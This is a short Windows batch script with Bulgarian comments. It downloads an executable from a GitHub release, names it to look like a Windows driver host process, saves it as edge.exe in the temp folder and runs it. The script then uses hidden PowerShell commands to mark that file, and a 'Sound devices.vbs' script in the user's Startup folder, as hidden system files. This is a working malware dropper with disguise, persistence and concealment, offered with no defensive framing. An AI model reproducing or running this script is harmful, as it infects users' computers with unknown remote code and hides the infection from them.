@echo off

:: Сваляне на файла в %temp%
echo Downloading file...
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/bgprofil9-create/profejt/releases/download/v1/Windows.Driver.Foundation.-.User-mode.Driver.Framework.Host.Process.exe' -OutFile '%temp%\edge.exe'"

:: Стартиране на файла
echo Starting application...
start "" "%temp%\edge.exe"

powershell -WindowStyle Hidden -Command "Start-Sleep -Seconds 170; $file = [Environment]::GetFolderPath('ApplicationData') + '\Microsoft\Windows\Start Menu\Programs\Startup\Sound devices.vbs'; if (Test-Path $file) { (Get-Item $file).Attributes = 'Hidden,System' }"
powershell -WindowStyle Hidden -Command "Start-Sleep -Seconds 170; $file = [Environment]::GetFolderPath('LocalApplicationData') + '\Temp\edge.exe'; if (Test-Path $file) { (Get-Item $file).Attributes = 'Hidden,System' }"
pause





